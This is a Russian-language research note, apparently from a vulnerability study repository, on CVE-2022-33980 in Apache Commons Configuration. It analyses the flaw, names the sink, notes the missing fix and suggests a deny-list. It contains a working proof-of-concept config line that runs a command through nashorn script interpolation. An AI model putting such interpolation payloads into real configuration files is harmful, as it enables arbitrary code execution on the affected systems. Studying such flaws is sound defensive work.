## CVE-2022-33980

https://github.com/advisories/GHSA-xj57-8qj4-c4m6

Уязвимость позволяет злоумышленникам выполнять код или подключаться к удалённым серверам, если используются ненадёжные
значения конфигурации. Таким образом открывается возможность для удалённого исполнения кода

## POC

[config.properties](../src/main/resources/config.properties):

```
property=${script:nashorn:java.lang.Runtime.getRuntime().exec('echo 1')}
```

Код:

[CommonsConfigurationAttack.java](../src/main/java/org/example/CommonsConfigurationAttack.java)

Результат:

```
Interpolated property: Process[pid=17550, exitValue="not exited"]
```

То есть произошел вызов произвольного кода

## Sink

java.lang.invoke.MethodHandle#invokeExact

Публичный метод, который надо вызывать: org.apache.commons.configuration2.builder.fluent.Configurations.properties

## Fix

Конкретное исправление не нашел, но нашел 2 связанные ишью:

- https://issues.apache.org/jira/browse/CONFIGURATION-753
- https://issues.apache.org/jira/browse/CONFIGURATION-764

Также глянул на все коммиты между 2.8.0 и 2.7.0:
https://github.com/apache/commons-configuration/commits/59e5152722198526c6ffe5361de7d1a6a87275c7, но тут тоже не
нашел исправление

Подозреваю, что если бы оно было, то выглядело бы как запрет на уровне конфигурации парсера файлов использовать классы
из nashorn, как это было сделано в библиотеке xstream:

```
xstream.denyTypes(new String[] {"jdk.nashorn.internal.objects.NativeString"});
xstream.denyTypesByRegExp(new String[] {".*\\.ReadAllStream\\$FileStream"});
```
